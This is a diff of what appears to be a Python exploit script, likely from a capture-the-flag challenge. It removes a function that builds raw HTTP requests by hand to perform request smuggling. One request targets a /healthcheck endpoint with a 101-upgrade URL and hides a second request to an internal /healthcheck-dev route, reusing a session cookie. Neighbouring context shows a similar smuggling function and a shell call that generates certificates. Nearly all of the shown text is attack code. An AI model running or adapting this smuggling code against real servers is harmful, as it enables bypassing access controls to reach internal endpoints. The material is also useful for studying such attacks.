@@ -55,26 +55,6 @@ def req_smug(url):
     r.send(req1.encode())
     r.close()
 
-def req_smug_101(url, url101):
-    domain = URL.split("//")[1]
-    ip, port = domain.split(":")
-    r = connect(ip, int(port))
-
-    nl = "\r\n"
-    req2 = f"GET /healthcheck-dev?url={url} HTTP/1.1{nl}" \
-            f"Host: {domain}{nl}" \
-            f"Cookie: connect.sid={s.cookies['connect.sid']}{nl}" \
-            f"{nl}"
-
-    req1 = f"GET /healthcheck?url={url101} HTTP/1.1{nl}" \
-               f"Host: {domain}{nl}" \
-               f"Cookie: connect.sid={s.cookies['connect.sid']}{nl}" \
-               f"{nl}" \
-               f"{req2}"
-    
-    r.send(req1.encode())
-    r.close()
-
 def add_cert():
     os.system("node gen_cert.js")
     data = {}
